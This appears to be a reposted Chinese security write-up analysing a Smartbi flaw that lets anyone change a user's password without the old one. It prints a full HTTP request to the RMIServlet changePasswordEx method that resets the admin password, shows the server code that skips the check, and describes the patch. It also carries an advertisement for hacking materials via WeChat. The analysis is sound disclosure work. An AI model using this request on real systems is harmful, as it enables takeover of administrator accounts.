## 漏洞简介

通过查看 Smartbi 的补丁包信息，发现存在漏洞在某种特定情况下修改用户的密码，进行简单的复现和分析

![image](https://image.3001.net/images/20230815/1692089698_64db3d62038d56f2b779d.png!small)​

## 漏洞复现

在页面上修改密码时，需要知道原本的用户对应的密码

![image](https://image.3001.net/images/20230815/1692089699_64db3d638cbe4296066ef.png!small)

![image](https://image.3001.net/images/20230815/1692089701_64db3d651c65eae3e3197.png!small)​

![image](https://image.3001.net/images/20230815/1692089702_64db3d666daebd723133d.png!small)​

直接构造这样的数据包，就不需要知道原本的密码，知道用户名就可以修改密码

    
    
    POST /smartbi/vision/RMIServlet HTTP/1.1  
    Host: 192.168.222.133:18080  
    Content-Length: 73  
    Cache-Control: max-age=0  
    If-Modified-Since: 0  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36  
    Content-Type: application/x-www-form-urlencoded;charset=UTF-8  
    Accept: */*  
    Origin: http://192.168.222.133:18080  
    Referer: http://192.168.222.133:18080/smartbi/vision/index.jsp  
    Accept-Encoding: gzip, deflate  
    Accept-Language: zh-CN,zh;q=0.9  
    Cookie: JSESSIONID=4A4AC06EC1DF3CDDC45239C211926FA1  
    Connection: close  
    ​  
    className=UserService&methodName=changePasswordEx&ampparams=["admin","","1"]

![image](https://image.3001.net/images/20230815/1692089703_64db3d67f16d66334dec8.png!small)​​![image](https://image.3001.net/images/20230815/1692089705_64db3d697198ddf5cbbb8.png!small)​

## 漏洞分析

`smartbi.usermanager.ILocalUserManagerModule#changePasswordEx`​

![image](https://image.3001.net/images/20230815/1692089706_64db3d6a6c0a57c59fde2.png!small)​

`smartbi.usermanager.UserManagerModule#changePasswordEx`​

![image](https://image.3001.net/images/20230815/1692089707_64db3d6b6fd27ac4bc959.png!small)

修改密码的操作虽然获取了用户名 原本的密码 修改后的新密码，但是对原本的密码并没有做任何校验处理

【----帮助网安学习，以下所有学习资料免费领！加vx：yj009991，备注“freebuf”获取！】

① 网安学习成长路径思维导图  
② 60+网安经典常用工具包  
③ 100+SRC漏洞分析报告  
④ 150+网安攻防实战技术电子书  
⑤ 最权威CISSP 认证考试指南+题库  
⑥ 超1800页CTF实战技巧手册  
⑦ 最新网安大厂面试题合集（含答案）  
⑧ APP客户端安全检测指南（安卓+IOS）

userId 是根据传入的用户名查询到的

`smartbi.usermanager.UserManagerModule#updateUserEx`​

![image](https://image.3001.net/images/20230815/1692089708_64db3d6cbc850e332d725.png!small)`smartbi.usermanager.UserManagerModule#updateUserExtend`​

![image](https://image.3001.net/images/20230815/1692089709_64db3d6debfeaabf4e08e.png!small)​

## 漏洞修复

上传补丁包后再发送数据包，发现被拦截

![image](https://image.3001.net/images/20230815/1692089711_64db3d6fa9fcb5acf2d0f.png!small)​

‍

![image](https://image.3001.net/images/20230815/1692089713_64db3d714cd45da41fbe7.png!small)​

![image](https://image.3001.net/images/20230815/1692089714_64db3d72544a31c2baf1f.png!small)​

匹配到对应的类名和方法就结束执行

 **更多网安技能的在线实操练习，[请点击这里>>](https://www.hetianlab.com/)**

